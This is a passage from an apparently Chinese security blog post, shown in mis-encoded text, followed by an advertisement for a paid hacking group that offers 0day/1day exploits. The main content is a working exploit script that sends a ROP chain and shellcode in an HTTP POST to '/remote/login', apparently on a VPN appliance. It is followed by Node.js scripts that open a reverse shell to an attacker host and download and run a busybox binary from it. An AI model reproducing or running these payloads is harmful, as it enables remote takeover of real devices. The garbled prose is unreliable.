Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  break

```  
  
å‘½ä»¤æ‰§è¡Œ /bin/node busy.js  
  
  
è¿™é‡Œæˆ‘ç”¨çš„æ˜¯execveå»æ‰§è¡Œ  
  
```
char *argv[] = { "/bin/node", "/busy.js", NULL };
char *envp[] = { "PATH=/usr/bin", "HOME=/root", NULL };

execve("/bin/node", argv, envp);
```  
  
å¯ä»¥å…ˆå†™ä¸ªdemoæµ‹è¯•ï¼Œè¿™é‡Œè¦æ³¨æ„çš„æ˜¯å†™shellcodeçš„æ—¶å€™ argv å’Œ envpåˆ†åˆ«æŒ‡çš„æ˜¯æ•°ç»„ï¼Œä¹Ÿå°±æ˜¯è¦æŠŠrsi rdxæŒ‡å‘æ„é€ å¥½çš„åœ°å€  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfKxMBibOnlDdGzj6lWrAoYadrd6yBXqFSibCA0Srt5sCVF1cg5sEXvSHg/640?wx_fmt=png&from=appmsg "")  
  
  
rsiæŒ‡å‘çš„æ˜¯0x7ff1eaec7d80å¯¹åº”ä¸‹é¢  
  
```
0x7ff1eaec7db8: "/bin/node"
0x7ff1eaec7dc0: "/busy.js"
nullÂ 
```  
  
ç±»ä¼¼è¿™ç§ï¼Œç„¶åæˆ‘ä»¬è¿™é‡Œæ‰“expå»æ‰§è¡Œä¹‹å‰çš„busy.jsæŒ‡ä»¤ åœ¨é£å¡”æˆ–è€…åŸç•Œé¢éƒ½æ˜¯æ²¡æœ‰è¾“å‡ºçš„  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfO6eBib0glyztPmZvct3E4Y2opq9rLlBrNZo2Ycpt3uut3ZNRbI9miaQQ/640?wx_fmt=png&from=appmsg "")  
  
  
å¯ä»¥çœ‹åˆ°æ²¡æœ‰ä»»ä½•å›æ˜¾ ä½†å°±æ˜¯æ‰§è¡ŒæˆåŠŸäº† æˆåŠŸæ”¾å…¥busyboxï¼Œè¿™é‡Œæ²¡æœ‰æ”¾å…¥binçš„åŸå› æ˜¯å› ä¸ºæ²¡æœ‰æƒé™æ‰€ä»¥æ”¾å…¥tmpæ–‡ä»¶å¤¹ä¸­  
  
  
å‘½ä»¤æ‰§è¡Œexp  
  
```
import socket
import ssl
from pwn import *
import random
import os
import sys
import time
from pwn import *
from ctypes import *
context.arch = 'amd64'


path = "/remote/login".encode()
content_length = ["115964116992"]
ip = "192.168.111.148"
#1376
#0x000000000257008a push rdx,pop rdi.ret
#0x0000000000530c8e : pop rsi ; ret
#0x000000000046bb27 : pop rax ; ret
#0x000000000060e7e9 : pop rax ; pop rsi ; ret ç»•è¿‡æœ€å¼€å§‹é‚£ä¸ª1æ— æ³•å†™å…¥çš„é™åˆ¶
#0x000000000043F3D0 call mprotectÂ 
#0x0000000000509372 : pop rdx ; ret
#0x0000000002a0e0e0 : add rdx, rax ; mov eax, edx ; sub eax, edi ; ret
#0x00000000005dc96d jmp rsp
#0x43A160 execl
def bytes2stack_bytes(bytes):
Â  Â  stack_str = "0x"
Â  Â  swap_data = bytearray(bytes)
Â  Â  swap_data.reverse()
Â  Â  for i in swap_data:
Â  Â  Â  Â  t = hex(i)[2:]
Â  Â  Â  Â  stack_str+=t

Â  Â  return stack_str
shellcode1 = asm('''
Â  Â  lea rax, [rip + 0x69]
Â  Â  jmp rax
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop
Â  Â  nop

''')
print(len(shellcode1))
def gen_shellcode_download_file():
Â  Â  save_path2 = bytes2stack_bytes(b"/cin/bus")
Â  Â  save_path1 = bytes2stack_bytes(b'ybox')
Â  Â  arg2 = bytes2stack_bytes(b"/bin/nod")
Â  Â  arg1 = bytes2stack_bytes(b"e"+b'\x00'*7)
Â  Â  filename = bytes2stack_bytes(b"busy.js")

Â  Â  ip_addr2 = bytes2stack_bytes(b"111.160")
Â  Â  ip_addr1 = bytes2stack_bytes(b"192.168.")

Â  Â  cmd_path2 = bytes2stack_bytes(b"p")
Â  Â  cmd_path1 = bytes2stack_bytes(b"/bin/tft")
Â  Â  arg3=bytes2stack_bytes(b'node')
Â  Â  arg4=bytes2stack_bytes(b'/busy.js')
Â  Â  arg5=bytes2stack_bytes(b'0')
Â  Â  shellcode = asm('''
Â  Â  Â  sub rsp,0x1000
Â  Â  Â  push 0
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx, {}
Â  Â  Â  push rbx
Â  Â  Â  mov rdi, rsp
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rsi,rsp
Â  Â  Â  sub rsp,0x8
Â  Â  Â  mov rbx,{}
Â  Â  Â  push rbx
Â  Â  Â  mov rdx,rsp
Â  Â  Â  mov rbx,0
Â  Â  Â  push rbx
Â  Â  Â  mov rcx,rsp
Â  Â  Â  push rdx
Â  Â  Â  push rdi

Â  Â  Â  mov rsi,rsp
Â  Â  Â  sub rsp,0x100
Â  Â  Â  push rcx
Â  Â  Â  mov rdx,rsp
Â  Â  Â  add rax,0x70
Â  Â  Â  mov rsp,rax

Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  nop
Â  Â  Â  ret
'''.format(arg1,arg2,arg1,arg2,arg4))
Â  Â  print(shellcode)
Â  Â  print(hex(len(shellcode)))
Â  Â  return shellcode
ROP=struct.pack('q',0x000000000060e7e9)
ROP+=struct.pack('Q',0xffffffffffeA5288)
ROP+=struct.pack('q',0)
ROP+=struct.pack('q',0x0000000002a0e0e0)
ROP+=struct.pack('q',0x000000000257008a)
ROP+=struct.pack('q',0x0000000000530c8e)
ROP+=struct.pack('q',0x200000)
ROP+=struct.pack('q',0x0000000000509372)
ROP+=struct.pack('q',0x7)
ROP+=struct.pack('q',0x000000000043F3D0)
ROP+=struct.pack('q',0x00000000005dc96d)
ROP+=shellcode1
#441A50

print(hex(len(ROP)))

payload=b'a'*0x560+ROP
payload=payload.ljust(0x620,b'a')+struct.pack('q', 0x0000000000febbaa)+gen_shellcode_download_file()+struct.pack('q',0x0442EC0)
for CL in content_length:
Â  Â  try:
Â  Â  Â  Â  data = b"POST " + path + b" HTTP/1.1\r\nHost: " + \
Â  Â  Â  Â  Â  Â  ip.encode() + b"\r\nContent-Length: " + CL.encode() + \
Â  Â  Â  Â  Â  Â  b"\r\nUser-Agent: Mozilla/5.0\r\nContent-Type: text/plain;charset=UTF-8\r\nAccept: */*\r\n\r\n"+payload

Â  Â  Â  Â  _socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
Â  Â  Â  Â  _socket.connect((ip, 4433))
Â  Â  Â  Â  _default_context = ssl._create_unverified_context()
Â  Â  Â  Â  _socket = _default_context.wrap_socket(_socket)
Â  Â  Â  Â  _socket.sendall(data)
Â  Â  Â  Â  res = _socket.recv(1024)
Â  Â  Â  Â  print(res)
Â  Â  Â  Â  if b"HTTP/1.1" not in res:
Â  Â  Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  Â  Â  break
Â  Â  except Exception as e:
Â  Â  Â  Â  print(e)
Â  Â  Â  Â  print("Error detected")
Â  Â  Â  Â  print(CL)
Â  Â  Â  Â  break

```  
  
æ¥ä¸‹æ¥æœ‰äº†busyboxä¹‹å æˆ‘ä»¬å°±å¯ä»¥å›åˆ°å¸¦shç¯å¢ƒä¸‹å»è¿›è¡Œæ”»å‡»äº† åªæ˜¯æŠŠ/bin/busyboxæ”¹ä¸º/tmp/busybox  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfrMFThwgK7dgib7Q33uTuOMRx5s6OViaE8PZRktP3q9orNo4MsY93FQYA/640?wx_fmt=png&from=appmsg "")  
  
#### nodejsæ¸²æŸ“è¿›è¡Œåå¼¹shell(é€šè¿‡å‰é¢çš„æ–¹å¼å»å¾—åˆ°busybox)  
  
  
jsæ–‡ä»¶  
  
```
const net = require('net');
const cp = require('child_process');

const busyboxPath = '/tmp/busybox';
const cmds = ['sh', 'ls', 'cat', 'wget', 'ps', 'netstat']; // éœ€è¦è½¯é“¾çš„å‘½ä»¤åˆ—è¡¨

function setupBusyboxLinks() {
Â  Â  const { execSync } = cp;
Â  Â  try {
Â  Â  Â  Â  cmds.forEach(cmd => {
Â  Â  Â  Â  Â  Â  // æ³¨æ„ï¼šæ‰€æœ‰å‘½ä»¤éƒ½ç”¨ /tmp/busybox è°ƒç”¨
Â  Â  Â  Â  Â  Â  execSync(`${busyboxPath} ln -sf busybox ${cmd}`, { cwd: '/tmp' });
Â  Â  Â  Â  });
Â  Â  } catch (e) {
Â  Â  Â  Â  // å¤±è´¥å¿½ç•¥
Â  Â  }
}

setupBusyboxLinks();

const client = new net.Socket();

client.connect(4444, '192.168.111.160', () => {
Â  Â  const sh = cp.spawn(busyboxPath, ['sh'], {
Â  Â  Â  Â  env: Object.assign({}, process.env, {
Â  Â  Â  Â  Â  Â  PATH: `/tmp:${process.env.PATH || ''}`
Â  Â  Â  Â  })
Â  Â  });

Â  Â  client.pipe(sh.stdin);
Â  Â  sh.stdout.pipe(client);
Â  Â  sh.stderr.pipe(client);

Â  Â  sh.on('exit', () => {
Â  Â  Â  Â  client.end();
Â  Â  });
});

client.on('error', () => {
Â  Â  client.end();
});

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dfBiaE6sf0srwxicEwibmicFEa6bTgghqqGprxH09bEskUjpWrCTfl9G0shQ/640?wx_fmt=png&from=appmsg "")  
  
  
nodejsæ¸²æŸ“é€šè¿‡jsæ¥æ¨¡æ‹Ÿwgetè¯·æ±‚ä¸‹è½½busyboxå¹¶ä¸”èµ‹æƒ  
  
  
jsæ–‡ä»¶  
  
```
const http = require('http');
const fs = require('fs');
const { exec } = require('child_process');

// æŒ‡å®šæ”»å‡»æœºçš„ IP åœ°å€å’Œè·¯å¾„
const url = 'http://192.168.111.160/busybox';
const outputPath = '/tmp/busybox'; Â // æ–‡ä»¶ä¿å­˜è·¯å¾„

http.get(url, (response) => {
Â  Â  const fileStream = fs.createWriteStream(outputPath);
Â  Â  response.pipe(fileStream);

Â  Â  fileStream.on('finish', () => {
Â  Â  Â  Â  console.log('ä¸‹è½½æˆåŠŸï¼');

Â  Â  Â  Â  // è®¾ç½®æ‰§è¡Œæƒé™ï¼Œç¡®ä¿æ–‡ä»¶å¯æ‰§è¡Œ
Â  Â  Â  Â  fs.chmod(outputPath, 0o755, (err) => {
Â  Â  Â  Â  Â  Â  if (err) {
Â  Â  Â  Â  Â  Â  Â  Â  console.log('èµ‹æƒå¤±è´¥:', err);
Â  Â  Â  Â  Â  Â  Â  Â  return;
Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  console.log('æ–‡ä»¶æƒé™å·²æ›´æ–°ï¼Œå…è®¸æ‰§è¡Œï¼');

Â  Â  Â  Â  Â  Â  // é€šè¿‡ busybox æ‰§è¡Œåå¼¹ shell æˆ–å…¶ä»–æ“ä½œ
Â  Â  Â  Â  Â  Â  exec(`/tmp/busybox`, (err, stdout, stderr) => {
Â  Â  Â  Â  Â  Â  Â  Â  if (err) {
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  console.error('æ‰§è¡Œå¤±è´¥:', stderr);
Â  Â  Â  Â  Â  Â  Â  Â  Â  Â  return;
Â  Â  Â  Â  Â  Â  Â  Â  }
Â  Â  Â  Â  Â  Â  Â  Â  console.log('æ‰§è¡Œè¾“å‡º:', stdout);
Â  Â  Â  Â  Â  Â  });
Â  Â  Â  Â  });
Â  Â  });
}).on('error', (err) => {
Â  Â  console.log('ä¸‹è½½å¤±è´¥:', err);
});
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWy211pOPXehgD2zYQXt8dftHEWQGTia215UF4oDPOSHnIdekAI4gicBxia0rA1Ihu2rbiaNZGBx21k7w/640?wx_fmt=png&from=appmsg "")  
  
  
  
**å†…éƒ¨åœˆå­è¯¦æƒ…ä»‹ç»**  
  
  
  
æˆ‘ä»¬æ˜¯  
ç¥å†œå®‰å…¨  
ï¼Œç‚¹èµ + åœ¨çœ‹  
Â é“é“ä»¬ç‚¹èµ·æ¥ï¼Œæœ€åç¥å¤§å®¶éƒ½èƒ½å¿ƒæƒ³äº‹æˆã€å‘å¤§è´¢ã€è¡Œå¤§è¿ã€‚  
  
![](https://mmbiz.qpic.cn/mmbiz_png/mngWTkJEOYJDOsevNTXW8ERI6DU2dZSH3Wd1AqGpw29ibCuYsmdMhUraS4MsYwyjuoB8eIFIicvoVuazwCV79t8A/640?wx_fmt=png&tp=wxpic&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap086iau0Y0jfCXicYKq3CCX9qSib3Xlb2CWzYLOn4icaWruKmYMvqSgk1I0Aw/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**å†…éƒ¨åœˆå­ä»‹ç»**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/MVPvEL7Qg0F0PmZricIVE4aZnhtO9Ap08Z60FsVfKEBeQVmcSg1YS1uop1o9V1uibicy1tXCD6tMvzTjeGt34qr3g/640?wx_fmt=gif&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
**åœˆå­ä¸“æ³¨äºæ›´æ–°src/çº¢è“æ”»é˜²ç›¸å…³ï¼š**  
  
```
1ã€ç»´æŠ¤æ›´æ–°srcä¸“é¡¹æ¼æ´çŸ¥è¯†åº“ï¼ŒåŒ…å«åŸç†ã€æŒ–æ˜æŠ€å·§ã€å®æˆ˜æ¡ˆä¾‹
2ã€çŸ¥è¯†æ˜Ÿçƒä¸“å±å¾®ä¿¡â€œå°åœˆå­äº¤æµç¾¤â€
3ã€å¾®ä¿¡å°ç¾¤ä¸€èµ·æŒ–æ´
4ã€å†…éƒ¨å›¢é˜Ÿä¸“å±EDUSRCè¯ä¹¦ç«™æ¼æ´æŠ¥å‘Š
5ã€åˆ†äº«srcä¼˜è´¨è§†é¢‘è¯¾ç¨‹ï¼ˆä¼ä¸šsrc/EDUSRC/çº¢è“é˜Ÿæ”»é˜²ï¼‰
6ã€åˆ†äº«srcæŒ–æ˜æŠ€å·§tips
7ã€ä¸å®šæœŸæœ‰ä¼—æµ‹ã€æ¸—é€æµ‹è¯•é¡¹ç›®ï¼ˆä¸€èµ·æŒ£é’±ï¼‰
8ã€ä¸å®šæœŸæœ‰å·¥ä½œæ‹›è˜å†…æ¨ï¼ˆå·¥ä½œ/æŠ¤ç½‘å†…æ¨ï¼‰
9ã€é€å…¨å›½èŒä¸šæŠ€èƒ½å¤§èµ›ç¯å¢ƒ+WPè§£æï¼ˆæ¯”èµ›æ‹¿å¥–ï¼‰
```  
  
  
  
  
**å†…éƒ¨åœˆå­**  
**ä¸“æ ä»‹ç»**  
  
çŸ¥è¯†æ˜Ÿçƒå†…éƒ¨å…±äº«èµ„æ–™æˆªå±è¯¦æƒ…å¦‚ä¸‹  
  
ï¼ˆåªè¦æ²¡æœ‰ç‰¹æ®Šæƒ…å†µï¼Œæ¯å¤©éƒ½ä¿æŒæ›´æ–°ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibRSekfPpgmzg6Pn4yH440wEZhQZaJaxJds7olZp5H8Ma4PicQFclzGbQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWWYcoLuuFqXztiaw8CzfxpMibgpeLSDuggy2U7TJWF3h7Af8JibBG0jA5fIyaYNUa2ODeG1r5DoOibAXA/640?wx_fmt=png&from=appmsg "")  
  
  
**çŸ¥è¯†æ˜Ÿçƒâ€”â€”**  
**ç¥å†œå®‰å…¨**  
  
æ˜Ÿçƒç°ä»·Â   
ï¿¥45å…ƒ  
  
å¦‚æœä½ è§‰å¾—åº”è¯¥åŠ å…¥ï¼Œå°±ä¸è¦çŠ¹è±«ï¼Œä»·æ ¼åªä¼šä¸Šæ¶¨ï¼Œä¸ä¼šä¸‹è·Œ  
  
æ˜Ÿçƒäººæ•°å°‘äº800äºº 45å…ƒ/å¹´  
  
æ˜Ÿçƒäººæ•°å°‘äº1000äºº 60å…ƒ/å¹´  
  
ï¼ˆæ–°äººä¼˜æƒ å·20ï¼Œæ‰«ç æˆ–è€…ç§ä¿¡æˆ‘å³å¯é¢†å–ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJHePfxfpEBEibsuTPjTxtvvTaS1M05C10sGweR6sKjhnt9amVS3aPicGQ/640?wx_fmt=png&from=appmsg "")  
  
æ¬¢è¿åŠ å…¥æ˜Ÿçƒä¸€èµ·äº¤æµï¼Œåˆ¸åä»·ä»…45å…ƒï¼ï¼ï¼ å³å°†æ»¡800äººæ¶¨ä»·  
  
é•¿æœŸ  
æ›´æ–°ï¼Œæ›´å¤šçš„0day/1dayæ¼æ´POC/EXP  
  
  
  
**å†…éƒ¨çŸ¥è¯†åº“--**  
**ï¼ˆæŒç»­æ›´æ–°ä¸­ï¼‰**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFu12KTxgSfI69k7BChztff43VObUMsvvLyqsCRYoQnRKg1ibD7A0U3bQ/640?wx_fmt=png&from=appmsg "")  
  
  
**çŸ¥è¯†åº“éƒ¨åˆ†å¤§çº²ç›®å½•å¦‚ä¸‹ï¼š**  
  
çŸ¥è¯†åº“è·Ÿ  
çŸ¥è¯†æ˜Ÿçƒè”åŠ¨ï¼ŒåŸºæœ¬ä¸Šæ¯å¤©ä¿æŒ  
æ›´æ–°ï¼Œæ»¡è¶³åœˆå‹çš„éœ€æ±‚  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFhXF33IuCNWh4QOXjMyjshticibyeTV3ZmhJeGias5J14egV36UGXvwGSA/640?wx_fmt=png&from=appmsg "")  
  
  
çŸ¥è¯†åº“å’ŒçŸ¥è¯†æ˜Ÿçƒæœ‰å¸ˆå‚…ä»¬å…³æ³¨çš„  
EDUSRC  
å’Œ  
CNVDç›¸å…³å†…å®¹ï¼ˆå†…éƒ¨èµ„æ–™ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFKDNucibvibBty5UMNwpjeq1ToHpicPxpNwvRNj3JzWlz4QT1kbFqEdnaA/640?wx_fmt=png&from=appmsg "")  
  
  
è¿˜æœ‰ç½‘ä¸Šæµå‡ºæ¥çš„å„ç§  
SRC/CTFç­‰è¯¾ç¨‹è§†é¢‘  
  
é‡å¤§ç®¡é¥±ï¼Œæ‰«æä¸‹é¢çš„çŸ¥è¯†æ˜ŸçƒäºŒç»´ç åŠ å…¥å³å¯  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUw2r3biacicUOicXUZHWj2FgFxYMxoc1ViciafayxiaK0Z26g1kfbVDybCO8R88lqYQvOiaFgQ8fjOJEjxA/640?wx_fmt=png&from=appmsg "")  
  
  
  
ä¸ä¼šæŒ–CNVDï¼Ÿä¸ä¼šæŒ–EDURCï¼Ÿä¸ä¼šæŒ–ä¼ä¸šSRCï¼Ÿä¸ä¼šæ‰“ndayå’Œé€šæ€æ¼æ´ï¼Ÿ  
  
ç›´æ¥åŠ å…¥æˆ‘ä»¬å°åœˆå­ï¼š  
çŸ¥è¯†æ˜Ÿçƒ+å†…éƒ¨åœˆå­äº¤æµç¾¤+çŸ¥è¯†åº“  
  
å¿«æ¥å§ï¼ï¼  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJ5wUOL9GnsxoXibKezHTjL6Yvuw6y8nm5ibyL388DdDFvuAtGypahRevg/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
![å›¾ç‰‡](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWUMULI8zm64NrH1pNBpf6yJO0FHgdr6ach2iaibDRwicrB3Ct1WWhg9PA0fPw2J1icGjQgKENYDozpVJg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1 "")  
  
  
ç¥å†œå®‰å…¨çŸ¥è¯†åº“å†…éƒ¨é…ç½®å¾ˆå¤š  
å†…éƒ¨å·¥å…·å’Œèµ„æ–™ğŸ’¾ï¼Œ  
ç„æœºé¶åœºé‚€è¯·ç +EDUSRCé‚€è¯·ç ç­‰ç­‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDNtEt0PfMwXQRzn9EDBdibLWNDZXVVjog7wDlAUK1h3Y7OicPQCYaw2eA/640?wx_fmt=png&from=appmsg "")  
  
  
å¿«è¦æŠ¤ç½‘æ¥ä¸´ï¼Œæ˜¯ä¸æ˜¯éœ€è¦  
æŠ¤ç½‘é¢è¯•é¢˜æ±‡æ€»  
ï¼Ÿ  
é—®é¢˜+ç­”æ¡ˆï¼ˆè¶…çº§è¯¦ç»†ğŸ”ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDbLia1oCDxSyuY4j0ooxgqOibabZUDCibIzicM6SL2CMuAAa1Qe4UIRdq1g/640?wx_fmt=png&from=appmsg "")  
  
  
æœ€åï¼Œå¸ˆå‚…ä»¬ä¹Ÿæ˜¯å¸Œæœ›æ‰¾ä¸ª  
å¥½å·¥ä½œï¼Œé‚£ä¹ˆå¸¸è§çš„  
æ¸—é€æµ‹è¯•/å®‰æœå·¥ç¨‹å¸ˆ/é©»åœºé¢è¯•é¢˜ç›®ï¼Œä½ å€¼å¾—æ‹¥æœ‰ï¼ï¼ï¼  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWXjm2h60OalGLbwrsEO8gJDicYew8gfSB3nicq9RFgJIKFG1UWyC6ibgpialR2UZlicW3mOBqVib7SLyDtQ/640?wx_fmt=png&from=appmsg "")  
  
  
  
å†…éƒ¨å°åœˆå­â€”â€”  
åœˆå‹åé¦ˆ  
ï¼ˆ  
è‰¯å¿ƒä»·æ ¼  
ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8Hviaqs0Uv6F4NTNkTKDictgOV445RLkia2rFg6s6eYTSaDunVaRF41qBibY1A/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/b7iaH1LtiaKWW0s5638ehXF2YQEqibt8HviaRhLXFayW3gyfu2eQDCicyctmplJfuMicVibquicNB3Bjdt0Ukhp8ib1G5aQ/640?wx_fmt=png&from=appmsg "")  
  
  
****  
**ç¥å†œå®‰å…¨å…¬å¼€äº¤æµç¾¤**  
  
æœ‰éœ€è¦çš„å¸ˆå‚…ä»¬ç›´æ¥æ‰«ææ–‡ç« äºŒç»´ç åŠ å…¥ï¼Œç„¶åè¦æ˜¯åé¢ç¾¤èŠäºŒç»´ç æ‰«æåŠ å…¥ä¸äº†çš„å¸ˆå‚…ä»¬ï¼Œç›´æ¥æ‰«ææ–‡ç« å¼€å¤´çš„äºŒç»´ç åŠ æˆ‘ï¼ˆå¤‡æ³¨åŠ ç¾¤ï¼‰  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b7iaH1LtiaKWV3tDTbzdQK4qCdxgHkSbgibaLP4ChjjO3BIeMgdTz3YelibqGvekSLXV3s1JpWkncKqYgbfZvOLENg/640?wx_fmt=jpeg&from=appmsg "")  
  
****  
Â Â   
```
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/b7iaH1LtiaKWW8vxK39q53Q3oictKW3VAXz4Qht144X0wjJcOMqPwhnh3ptlbTtxDvNMF8NJA6XbDcljZBsibalsVQ/640?wx_fmt=gif "")  
  
  
  
